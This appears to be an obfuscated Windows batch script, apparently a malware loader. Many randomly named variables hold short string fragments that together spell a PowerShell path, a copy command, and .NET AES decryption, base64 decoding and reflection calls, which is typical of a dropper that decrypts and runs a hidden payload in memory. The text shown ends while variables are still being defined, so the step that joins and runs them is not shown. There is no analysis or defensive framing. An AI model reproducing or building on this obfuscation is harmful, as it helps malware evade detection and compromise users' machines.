@echo off
set "uHmFVLmrVg=nd"
set "KsviUXrQMG=Po"
set "AKRRUYvAKD=Wi"
set "MthgXLAChY=32"
set "OdYsIsfqrF=we"
set "KTAfhFCMqS=0\"
set "luMsIlKiTy=rS"
set "uGyAtWZeaU=rs"
set "lLWJVgZTjP=s\"
set "vSdisJLDKP=em"
set "WZTIxTAyvL=.e"
set "niWogtuenK=1."
set "MTMHjokhGf=he"
set "LgzFZcDCxC=ow"
set "jZFWybGeAW=Sy"
set "TJdTxVQBNK=ws"
set "vzcBuHZshB=\W"
set "rELhYpJDTI=we"
set "bgAzdxSdXJ=xe"
set "UObqtqWwEO=in"
set "QzkizpGdAJ=\v"
set "hUKxtfithS=ll"
set "UnYfWgsFVw=py"
set "RQLeNEApAT= C"
set "BXwJKmvZzI=co"
set "qduLjOwEGP=do"
set "eBXNAAVago= /"
set "OFXhXMadjp=y "
set "ISKvHuVHJm=:\"
set "hDLDBullRS=st"
set "AYYPHalAuP=po"
set "AvJTeXHlQl=he"
set "xFSZbPLLke=ll"
set "UfgmlJYYFB= %~dp0"
set "kNBvFawJQn=cd"
set "UCvFKJcZln=hcM."
set "DxnvqzvMgF=.Key"
set "qnGAhZLjss=vj0m"
set "PxKAwgtDUW=.Cry"
set "LUFShUyTsm=F'[-"
set "miMNmKsHKN=flec"
set "NdjLQZVUXI=and "
set "jGmXXRSIDl=m.Re"
set "lSsBPZnAYr=bstr"
set "YjeboRQfOc=;$Xg"
set "FDGsexgGwq=t Sy"
set "vjhheiEhgh=WlG "
set "yQNYgLgFld=; };"
set "rtTwbrvfbD= [Sy"
set "lUjjHuVUmQ=tem."
set "hGhonbPBei=glUa"
set "hnrFiRDxtE=, $y"
set "RFunsvaojo=em.C"
set "RAAXwmNeTn=ty ="
set "sKyBfozEpU=oryS"
set "brvGAFnnkU=tion"
set "XNaUUNMcVB=  $s"
set "RgTvkKXDZD=ing("
set "cqdOXUbfBB=comm"
set "gUynelgBgq=s = "
set "rFQoaOgdmS=BC;$"
set "ddUyeNEuTD=s = "
set "sZLrIMPJMT=.Dis"
set "RLKgOeLzdh=Comp"
set "oEeiyFsMMU=();$"
set "kiWMLbisEe=ty);"
set "QxzOPXpmzK=yTo("
set "lzZZGlqvwc=:: '"
set "WccdyEcOhU=[Env"
set "EXAKSfgiya=.Cop"
set "SOnUtgANMs=Fo7l"
set "qWEqInHDpj=pose"
set "DOBnbCwlsF=ptor"
set "WoUauFgGMo=ode]"
set "Xyeuardnpo=ptog"
set "uILawAwZxr=gnir"
set "srttsiCTqZ=P = "
set "lxIPqwClTc=a.Pa"
set "aPagteuAHv=iron"
set "hjfnQpkbFY=.Dis"
set "jQUDjkFPGS=glUa"
set "ZehhIkENnh=eam("
set "cIkoqIKrDz=ss -"
set "jQBAAZUWII=raph"
set "uCWrFWUxXD=);$N"
set "OWHvpLTZtM=se()"
set "VLDdbLKuJD== $B"
set "REPmaotWCN=tsWi"
set "BUCNQjlHcV=.IO."
set "qOVKGlMqjc=esaB"
set "rPJOiBmRkG=[Sys"
set "XqLHIMCKiy= = $"
set "ukozXmRiZj=oint"
set "KmauPjgFeO=::De"
set "sjLyrOVDTc=New-"
set "MCUdkYDjFV=bjec"
set "HALKwPsAts=JZus"
set "TYDaxyUGMY= '')"
set "ieCpUgoIqg=0O+g"
set "YJbflkENxa=ke($"
set "iFCjrWtZbQ=isfL"
set "vkkNibeWwA=S46e"
set "dKJbflJbOn=tem."
set "PLdffVIglW=esMa"
set "kwUkfHcWge= New"
set "YRSUpqPPJk=-1.."
set "AlxAUbmdke=rity"
set "dlanBYvKxS=rity"
set "chapmkHnFD=New-"
set "rDrlEEHNIS=;$Nn"
set "BWrxicmKll=Stre"
set "PgcrpYxubS=-4] "
set "pGwAYgszzn=7Yiv"
set "NQuVcZHATb=stem"
set "LqmeURFkwW=File"
set "iQQQZPJXgf=ptog"
set "ESlFtMLDuL=n ''"
set "ajglPjNrEv=m.IO"
